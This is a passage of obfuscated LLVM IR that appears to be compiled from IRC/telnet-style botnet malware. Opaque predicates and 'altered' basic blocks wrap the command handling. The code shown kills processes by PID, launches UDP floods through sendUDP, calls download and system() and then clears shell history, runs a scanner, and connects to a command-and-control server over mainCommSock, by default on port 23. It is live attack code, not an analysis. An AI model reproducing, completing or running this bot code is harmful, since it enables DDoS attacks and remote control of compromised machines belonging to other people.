  %1676 = load i8*, i8** %1675, align 8
  %1677 = call i32 @strcmp(i8* %1676, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0)) #10
  %1678 = icmp ne i32 %1677, 0
  %1679 = load i32, i32* @x.119
  %1680 = load i32, i32* @y.120
  %1681 = sub i32 %1679, 1
  %1682 = mul i32 %1679, %1681
  %1683 = urem i32 %1682, 2
  %1684 = icmp eq i32 %1683, 0
  %1685 = icmp slt i32 %1680, 10
  %1686 = or i1 %1684, %1685
  br i1 %1686, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1678, label %1761, label %1687

; <label>:1687:                                   ; preds = %originalBBpart2200
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  br label %1688

; <label>:1688:                                   ; preds = %1747, %1687
  %1689 = load i64, i64* %47, align 8
  %1690 = load i32, i32* @numpids, align 4
  %1691 = sext i32 %1690 to i64
  %1692 = icmp ult i64 %1689, %1691
  br i1 %1692, label %1693, label %1750

; <label>:1693:                                   ; preds = %1688
  %1694 = load i32, i32* @x.119
  %1695 = load i32, i32* @y.120
  %1696 = sub i32 %1694, 1
  %1697 = mul i32 %1694, %1696
  %1698 = urem i32 %1697, 2
  %1699 = icmp eq i32 %1698, 0
  %1700 = icmp slt i32 %1695, 10
  %1701 = or i1 %1699, %1700
  br i1 %1701, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1693
  %1702 = load i32*, i32** @pids, align 8
  %1703 = load i64, i64* %47, align 8
  %1704 = getelementptr inbounds i32, i32* %1702, i64 %1703
  %1705 = load i32, i32* %1704, align 4
  %1706 = icmp ne i32 %1705, 0
  %1707 = load i32, i32* @x.119
  %1708 = load i32, i32* @y.120
  %1709 = sub i32 %1707, 1
  %1710 = mul i32 %1707, %1709
  %1711 = urem i32 %1710, 2
  %1712 = icmp eq i32 %1711, 0
  %1713 = icmp slt i32 %1708, 10
  %1714 = or i1 %1712, %1713
  br i1 %1714, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br i1 %1706, label %1715, label %1730

; <label>:1715:                                   ; preds = %originalBBpart2204
  %1716 = load i32*, i32** @pids, align 8
  %1717 = load i64, i64* %47, align 8
  %1718 = getelementptr inbounds i32, i32* %1716, i64 %1717
  %1719 = load i32, i32* %1718, align 4
  %1720 = call i32 @getpid() #2
  %1721 = icmp ne i32 %1719, %1720
  br i1 %1721, label %1722, label %1730

; <label>:1722:                                   ; preds = %1715
  %1723 = load i32*, i32** @pids, align 8
  %1724 = load i64, i64* %47, align 8
  %1725 = getelementptr inbounds i32, i32* %1723, i64 %1724
  %1726 = load i32, i32* %1725, align 4
  %1727 = call i32 @kill(i32 %1726, i32 9) #2
  %1728 = load i32, i32* %46, align 4
  %1729 = add nsw i32 %1728, 1
  store i32 %1729, i32* %46, align 4
  br label %1730

; <label>:1730:                                   ; preds = %1722, %1715, %originalBBpart2204
  %1731 = load i32, i32* @x.119
  %1732 = load i32, i32* @y.120
  %1733 = sub i32 %1731, 1
  %1734 = mul i32 %1731, %1733
  %1735 = urem i32 %1734, 2
  %1736 = icmp eq i32 %1735, 0
  %1737 = icmp slt i32 %1732, 10
  %1738 = or i1 %1736, %1737
  br i1 %1738, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1730
  %1739 = load i32, i32* @x.119
  %1740 = load i32, i32* @y.120
  %1741 = sub i32 %1739, 1
  %1742 = mul i32 %1739, %1741
  %1743 = urem i32 %1742, 2
  %1744 = icmp eq i32 %1743, 0
  %1745 = icmp slt i32 %1740, 10
  %1746 = or i1 %1744, %1745
  br i1 %1746, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %1747

; <label>:1747:                                   ; preds = %originalBBpart2208
  %1748 = load i64, i64* %47, align 8
  %1749 = add i64 %1748, 1
  store i64 %1749, i64* %47, align 8
  br label %1688

; <label>:1750:                                   ; preds = %1688
  %1751 = load i32, i32* %46, align 4
  %1752 = icmp sgt i32 %1751, 0
  br i1 %1752, label %1753, label %1757

; <label>:1753:                                   ; preds = %1750
  %1754 = load i32, i32* @mainCommSock, align 4
  %1755 = load i32, i32* %46, align 4
  %1756 = call i32 (i32, i8*, ...) @sockprintf(i32 %1754, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0), i32 %1755)
  br label %1760

; <label>:1757:                                   ; preds = %1750
  %1758 = load i32, i32* @mainCommSock, align 4
  %1759 = call i32 (i32, i8*, ...) @sockprintf(i32 %1758, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.472, i32 0, i32 0))
  br label %1760

; <label>:1760:                                   ; preds = %1757, %1753
  br label %1761

; <label>:1761:                                   ; preds = %1760, %originalBBpart2200
  %1762 = load i32, i32* @x.119
  %1763 = load i32, i32* @y.120
  %1764 = sub i32 %1762, 1
  %1765 = mul i32 %1762, %1764
  %1766 = urem i32 %1765, 2
  %1767 = icmp eq i32 %1766, 0
  %1768 = icmp slt i32 %1763, 10
  %1769 = or i1 %1767, %1768
  br i1 %1769, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1761
  %1770 = load i8**, i8*** %4, align 8
  %1771 = getelementptr inbounds i8*, i8** %1770, i64 0
  %1772 = load i8*, i8** %1771, align 8
  %1773 = call i32 @strcmp(i8* %1772, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i32 0, i32 0)) #10
  %1774 = icmp ne i32 %1773, 0
  %1775 = load i32, i32* @x.119
  %1776 = load i32, i32* @y.120
  %1777 = sub i32 %1775, 1
  %1778 = mul i32 %1775, %1777
  %1779 = urem i32 %1778, 2
  %1780 = icmp eq i32 %1779, 0
  %1781 = icmp slt i32 %1776, 10
  %1782 = or i1 %1780, %1781
  br i1 %1782, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1774, label %1784, label %1783

; <label>:1783:                                   ; preds = %originalBBpart2212
  call void @exit(i32 0) #14
  unreachable

; <label>:1784:                                   ; preds = %originalBBpart2212, %originalBBpart2192, %originalBBpart2176, %1483, %1380, %1343, %originalBBpart2132, %originalBBpart2100, %867, %684, %616, %originalBBpart232, %301, %229, %originalBBpart212, %200, %169, %151, %originalBBpart24, %116
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %59
  %1785 = call i32 @system(i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i32 0, i32 0))
  call void @ClearHistory()
  %1786 = load i32, i32* @mainCommSock, align 4
  %1787 = call i32 (i32, i8*, ...) @sockprintf(i32 %1786, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i32 0, i32 0))
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %125
  %1788 = load i32, i32* @mainCommSock, align 4
  %1789 = call i32 @getdtablesize() #2
  %1790 = call i32 (i32, i8*, ...) @sockprintf(i32 %1788, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %1789)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %175
  %1791 = load i8**, i8*** %4, align 8
  %1792 = getelementptr inbounds i8*, i8** %1791, i64 1
  %1793 = load i8*, i8** %1792, align 8
  %1794 = call i32 @strcmp(i8* %1793, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i32 0, i32 0)) #10
  %1795 = icmp ne i32 %1794, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %208
  %1796 = load i32, i32* %5, align 4
  store i32 %1796, i32* @scanPid, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %230
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %270
  %1797 = call i32 @listFork()
  %1798 = icmp ne i32 %1797, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %321
  %1799 = load i8**, i8*** %4, align 8
  %1800 = getelementptr inbounds i8*, i8** %1799, i64 2
  %1801 = load i8*, i8** %1800, align 8
  %1802 = call i32 @atoi(i8* %1801) #10
  %1803 = icmp eq i32 %1802, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %355
  %1804 = load i8**, i8*** %4, align 8
  %1805 = getelementptr inbounds i8*, i8** %1804, i64 5
  %1806 = load i8*, i8** %1805, align 8
  %1807 = call i32 @atoi(i8* %1806) #10
  %1808 = icmp sgt i32 %1807, 65536
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %398
  %1809 = load i32, i32* @mainCommSock, align 4
  %1810 = call i32 (i32, i8*, ...) @sockprintf(i32 %1809, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i32 0, i32 0))
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %417
  %1811 = load i8**, i8*** %4, align 8
  %1812 = getelementptr inbounds i8*, i8** %1811, i64 1
  %1813 = load i8*, i8** %1812, align 8
  store i8* %1813, i8** %10, align 8
  %1814 = load i8**, i8*** %4, align 8
  %1815 = getelementptr inbounds i8*, i8** %1814, i64 2
  %1816 = load i8*, i8** %1815, align 8
  %1817 = call i32 @atoi(i8* %1816) #10
  store i32 %1817, i32* %11, align 4
  %1818 = load i8**, i8*** %4, align 8
  %1819 = getelementptr inbounds i8*, i8** %1818, i64 3
  %1820 = load i8*, i8** %1819, align 8
  %1821 = call i32 @atoi(i8* %1820) #10
  store i32 %1821, i32* %12, align 4
  %1822 = load i8**, i8*** %4, align 8
  %1823 = getelementptr inbounds i8*, i8** %1822, i64 4
  %1824 = load i8*, i8** %1823, align 8
  %1825 = call i32 @atoi(i8* %1824) #10
  store i32 %1825, i32* %13, align 4
  %1826 = load i8**, i8*** %4, align 8
  %1827 = getelementptr inbounds i8*, i8** %1826, i64 5
  %1828 = load i8*, i8** %1827, align 8
  %1829 = call i32 @atoi(i8* %1828) #10
  store i32 %1829, i32* %14, align 4
  %1830 = load i32, i32* %3, align 4
  %1831 = icmp sgt i32 %1830, 6
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %460
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %496
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %513
  store i32 %514, i32* %17, align 4
  %1832 = load i8*, i8** %10, align 8
  %1833 = call i8* @strstr(i8* %1832, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1834 = icmp ne i8* %1833, null
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %537
  %1835 = load i8*, i8** %18, align 8
  %1836 = icmp ne i8* %1835, null
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %559
  %1837 = load i8*, i8** %18, align 8
  %1838 = load i32, i32* %11, align 4
  %1839 = load i32, i32* %12, align 4
  %1840 = load i32, i32* %13, align 4
  %1841 = load i32, i32* %14, align 4
  %1842 = load i32, i32* %15, align 4
  %1843 = load i32, i32* %16, align 4
  %1844 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %1837, i32 %1838, i32 %1839, i32 %1840, i32 %1841, i32 %1842, i32 %1843, i32 %1844)
  call void @_exit(i32 0) #12
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %584
  %1845 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1845, i8** %18, align 8
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %638
  %1846 = load i8**, i8*** %4, align 8
  %1847 = getelementptr inbounds i8*, i8** %1846, i64 4
  %1848 = load i8*, i8** %1847, align 8
  %1849 = call i32 @atoi(i8* %1848) #10
  %1850 = icmp eq i32 %1849, -1
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %713
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %739
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %767
  %1851 = call i32 @listFork()
  %1852 = icmp ne i32 %1851, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %796
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %826
  %1853 = load i8**, i8*** %4, align 8
  %1854 = getelementptr inbounds i8*, i8** %1853, i64 0
  %1855 = load i8*, i8** %1854, align 8
  %1856 = call i32 @strcmp(i8* %1855, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0)) #10
  %1857 = icmp ne i32 %1856, 0
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %848
  %1858 = load i32, i32* %3, align 4
  %1859 = icmp slt i32 %1858, 6
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %870
  %1860 = load i8**, i8*** %4, align 8
  %1861 = getelementptr inbounds i8*, i8** %1860, i64 1
  %1862 = load i8*, i8** %1861, align 8
  %1863 = call i8* @strstr(i8* %1862, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1864 = icmp ne i8* %1863, null
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %929
  %1865 = call i32 @listFork()
  %1866 = icmp ne i32 %1865, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %948
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %988
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %1005
  %1867 = load i8**, i8*** %4, align 8
  %1868 = getelementptr inbounds i8*, i8** %1867, i64 0
  %1869 = load i8*, i8** %1868, align 8
  %1870 = call i32 @strcmp(i8* %1869, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i32 0, i32 0)) #10
  %1871 = icmp ne i32 %1870, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %1030
  call void @exit(i32 1) #14
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1056
  %1872 = call i64 @time(i64* null) #2
  %1873 = trunc i64 %1872 to i32
  call void @srand(i32 %1873) #2
  %1874 = load i8**, i8*** %4, align 8
  %1875 = getelementptr inbounds i8*, i8** %1874, i64 4
  %1876 = load i8*, i8** %1875, align 8
  %1877 = call i32 @atoi(i8* %1876) #10
  store i32 %1877, i32* %29, align 4
  %1878 = load i8**, i8*** %4, align 8
  %1879 = getelementptr inbounds i8*, i8** %1878, i64 5
  %1880 = load i8*, i8** %1879, align 8
  %1881 = call i32 @atoi(i8* %1880) #10
  store i32 %1881, i32* %30, align 4
  store i32 0, i32* %32, align 4
  %1882 = load i8**, i8*** %4, align 8
  %1883 = getelementptr inbounds i8*, i8** %1882, i64 3
  %1884 = load i8*, i8** %1883, align 8
  %1885 = call i32 @download(i8* %1884, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0))
  %1886 = load i32, i32* @mainCommSock, align 4
  %1887 = load i8**, i8*** %4, align 8
  %1888 = getelementptr inbounds i8*, i8** %1887, i64 1
  %1889 = load i8*, i8** %1888, align 8
  %1890 = load i8**, i8*** %4, align 8
  %1891 = getelementptr inbounds i8*, i8** %1890, i64 2
  %1892 = load i8*, i8** %1891, align 8
  %1893 = load i8**, i8*** %4, align 8
  %1894 = getelementptr inbounds i8*, i8** %1893, i64 6
  %1895 = load i8*, i8** %1894, align 8
  %1896 = call i32 @atoi(i8* %1895) #10
  %1897 = load i8**, i8*** %4, align 8
  %1898 = getelementptr inbounds i8*, i8** %1897, i64 5
  %1899 = load i8*, i8** %1898, align 8
  %1900 = call i32 @atoi(i8* %1899) #10
  %1901 = call i32 (i32, i8*, ...) @sockprintf(i32 %1886, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i32 0, i32 0), i8* %1889, i8* %1892, i32 %1896, i32 %1900)
  %1902 = load i32, i32* %29, align 4
  %1903 = zext i32 %1902 to i64
  %1904 = call i8* @llvm.stacksave()
  store i8* %1904, i8** %33, align 8
  %1905 = alloca %struct.thread_data, i64 %1903, align 16
  store i32 0, i32* %31, align 4
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1155
  %1906 = load i8**, i8*** %4, align 8
  %1907 = getelementptr inbounds i8*, i8** %1906, i64 0
  %1908 = load i8*, i8** %1907, align 8
  %1909 = call i32 @strcmp(i8* %1908, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0)) #10
  %1910 = icmp ne i32 %1909, 0
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1180
  %1911 = load i8**, i8*** %4, align 8
  %1912 = getelementptr inbounds i8*, i8** %1911, i64 2
  %1913 = load i8*, i8** %1912, align 8
  %1914 = call i32 @atoi(i8* %1913) #10
  %1915 = icmp slt i32 %1914, 1
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1202
  %1916 = load i8**, i8*** %4, align 8
  %1917 = getelementptr inbounds i8*, i8** %1916, i64 3
  %1918 = load i8*, i8** %1917, align 8
  %1919 = call i32 @atoi(i8* %1918) #10
  %1920 = icmp slt i32 %1919, 1
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1224
  %1921 = load i32, i32* @mainCommSock, align 4
  %1922 = call i32 (i32, i8*, ...) @sockprintf(i32 %1921, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i32 0, i32 0))
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1243
  %1923 = load i8**, i8*** %4, align 8
  %1924 = getelementptr inbounds i8*, i8** %1923, i64 1
  %1925 = load i8*, i8** %1924, align 8
  store i8* %1925, i8** %34, align 8
  %1926 = load i8**, i8*** %4, align 8
  %1927 = getelementptr inbounds i8*, i8** %1926, i64 2
  %1928 = load i8*, i8** %1927, align 8
  %1929 = call i32 @atoi(i8* %1928) #10
  store i32 %1929, i32* %35, align 4
  %1930 = load i8**, i8*** %4, align 8
  %1931 = getelementptr inbounds i8*, i8** %1930, i64 3
  %1932 = load i8*, i8** %1931, align 8
  %1933 = call i32 @atoi(i8* %1932) #10
  store i32 %1933, i32* %36, align 4
  %1934 = load i8*, i8** %34, align 8
  %1935 = call i8* @strstr(i8* %1934, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1936 = icmp ne i8* %1935, null
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1289
  %1937 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1937, i8** %37, align 8
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1307
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1324
  %1938 = call i32 @listFork()
  %1939 = icmp ne i32 %1938, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1348
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1383
  %1940 = load i8**, i8*** %4, align 8
  %1941 = getelementptr inbounds i8*, i8** %1940, i64 1
  %1942 = load i8*, i8** %1941, align 8
  store i8* %1942, i8** %38, align 8
  %1943 = load i8**, i8*** %4, align 8
  %1944 = getelementptr inbounds i8*, i8** %1943, i64 2
  %1945 = load i8*, i8** %1944, align 8
  %1946 = call i32 @atoi(i8* %1945) #10
  store i32 %1946, i32* %39, align 4
  %1947 = load i8**, i8*** %4, align 8
  %1948 = getelementptr inbounds i8*, i8** %1947, i64 3
  %1949 = load i8*, i8** %1948, align 8
  %1950 = call i32 @atoi(i8* %1949) #10
  store i32 %1950, i32* %40, align 4
  %1951 = load i8*, i8** %38, align 8
  %1952 = call i8* @strstr(i8* %1951, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1953 = icmp ne i8* %1952, null
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1417
  %1954 = load i8*, i8** %41, align 8
  %1955 = icmp ne i8* %1954, null
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1436
  %1956 = call i32 @listFork()
  %1957 = icmp ne i32 %1956, 0
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1463
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1504
  %1958 = load i8**, i8*** %4, align 8
  %1959 = getelementptr inbounds i8*, i8** %1958, i64 3
  %1960 = load i8*, i8** %1959, align 8
  %1961 = call i32 @atoi(i8* %1960) #10
  %1962 = icmp slt i32 %1961, 1
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1526
  %1963 = load i32, i32* @mainCommSock, align 4
  %1964 = call i32 (i32, i8*, ...) @sockprintf(i32 %1963, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i32 0, i32 0))
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1566
  %1965 = call i32 @listFork()
  %1966 = icmp ne i32 %1965, 0
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1589
  %1967 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1967, i8** %45, align 8
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1607
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1627
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1648
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1665
  %1968 = load i8**, i8*** %4, align 8
  %1969 = getelementptr inbounds i8*, i8** %1968, i64 0
  %1970 = load i8*, i8** %1969, align 8
  %1971 = call i32 @strcmp(i8* %1970, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0)) #10
  %1972 = icmp ne i32 %1971, 0
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1693
  %1973 = load i32*, i32** @pids, align 8
  %1974 = load i64, i64* %47, align 8
  %1975 = getelementptr inbounds i32, i32* %1973, i64 %1974
  %1976 = load i32, i32* %1975, align 4
  %1977 = icmp ne i32 %1976, 0
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1730
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1761
  %1978 = load i8**, i8*** %4, align 8
  %1979 = getelementptr inbounds i8*, i8** %1978, i64 0
  %1980 = load i8*, i8** %1979, align 8
  %1981 = call i32 @strcmp(i8* %1980, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i32 0, i32 0)) #10
  %1982 = icmp ne i32 %1981, 0
  br label %originalBB210
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind
declare i64 @sysconf(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = load i32, i32* @x.121
  %2 = load i32, i32* @y.122
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %12, i8 0, i64 4096, i32 16, i1 false)
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = icmp ne i32 %13, 0
  %15 = load i32, i32* @x.121
  %16 = load i32, i32* @y.122
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* @mainCommSock, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %originalBBpart2
  %27 = load i32, i32* @x.121
  %28 = load i32, i32* @y.122
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* @currentServer, align 4
  %36 = add nsw i32 %35, 1
  %37 = sext i32 %36 to i64
  %38 = icmp eq i64 %37, 1
  %39 = load i32, i32* @x.121
  %40 = load i32, i32* @y.122
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br i1 %38, label %47, label %64

; <label>:47:                                     ; preds = %originalBBpart25
  %48 = load i32, i32* @x.121
  %49 = load i32, i32* @y.122
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %47
  store i32 0, i32* @currentServer, align 4
  %56 = load i32, i32* @x.121
  %57 = load i32, i32* @y.122
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %83

; <label>:64:                                     ; preds = %originalBBpart25
  %65 = load i32, i32* @x.121
  %66 = load i32, i32* @y.122
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %64
  %73 = load i32, i32* @currentServer, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* @currentServer, align 4
  %75 = load i32, i32* @x.121
  %76 = load i32, i32* @y.122
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart224, label %originalBB11alteredBB

originalBBpart224:                                ; preds = %originalBB11
  br label %83

; <label>:83:                                     ; preds = %originalBBpart224, %originalBBpart29
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %85 = load i32, i32* @currentServer, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [1 x i8*], [1 x i8*]* @cncServer, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i8* @strcpy(i8* %84, i8* %88) #2
  store i32 23, i32* %11, align 4
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %91 = call i8* @strchr(i8* %90, i32 58) #10
  %92 = icmp ne i8* %91, null
  br i1 %92, label %93, label %100

; <label>:93:                                     ; preds = %83
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %95 = call i8* @strchr(i8* %94, i32 58) #10
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = call i32 @atoi(i8* %96) #10
  store i32 %97, i32* %11, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %99 = call i8* @strchr(i8* %98, i32 58) #10
  store i8 0, i8* %99, align 1
  br label %100

; <label>:100:                                    ; preds = %93, %83
  %101 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %101, i32* @mainCommSock, align 4
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %104 = load i32, i32* %11, align 4
  %105 = call i32 @connectTimeout(i32 %102, i8* %103, i32 %104, i32 30)
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %108, label %107

; <label>:107:                                    ; preds = %100
  store i32 1, i32* %9, align 4
  br label %109

; <label>:108:                                    ; preds = %100
  store i32 0, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  %110 = load i32, i32* %9, align 4
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %0
  %111 = alloca i32, align 4
  %112 = alloca [4096 x i8], align 16
  %113 = alloca i32, align 4
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %112, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 4096, i32 16, i1 false)
  %115 = load i32, i32* @mainCommSock, align 4
  %116 = icmp ne i32 %115, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
